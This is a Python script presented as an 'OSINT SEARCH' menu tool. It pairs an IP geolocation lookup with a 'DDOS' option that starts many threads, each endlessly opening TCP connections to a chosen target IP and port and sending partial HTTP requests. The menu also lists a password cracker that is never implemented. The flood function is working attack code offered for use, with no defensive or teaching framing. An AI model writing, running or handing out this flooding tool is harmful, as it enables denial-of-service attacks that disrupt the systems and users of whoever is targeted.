import socket
import threading
import requests

def ip_lookup(ip):
    response = requests.get(f"http://ip-api.com/json/{ip}")
    data = response.json()

    if data['status'] == 'success':
        location_info = (
            f"IP: {data['query']}\n"
            f"Country: {data['country']}\n"
            f"Region: {data['regionName']}\n"
            f"City: {data['city']}\n"
            f"ZIP: {data['zip']}\n"
            f"Lat: {data['lat']}\n"
            f"Lon: {data['lon']}\n"
            f"ISP: {data['isp']}\n"
            f"Org: {data['org']}\n"
            f"AS: {data['as']}\n"
        )
    else:
        location_info = "Failed to get location"

    return location_info

def ddos_attack(target_ip, target_port, thread_count):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                s.close()
            except:
                pass

    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()

def menu():
    while True:
        print("\nOSINT SEARCH")
        print("------------")
        print("6) IP lookup")
        print("7) DDOS")
        print("8) Password cracker")
        print("Q) Quit")

        choice = input("Select an option: ").strip().lower()
        
        if choice == '6':
            ip = input("Enter IP to lookup: ").strip()
            print("\nIP Lookup Result:\n")
            print(ip_lookup(ip))
        elif choice == '7':
            target_ip = input("Enter Target IP: ").strip()
            target_port = int(input("Enter Target Port: ").strip())
            thread_count = int(input("Enter Number of Threads: ").strip())
            print(f"\nStarting DDoS on {target_ip}:{target_port} with {thread_count} threads...")
            ddos_attack(target_ip, target_port, thread_count)
            print("DDoS attack started. Press any key to return to menu.")
            input()
        elif choice == 'q':
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    menu()
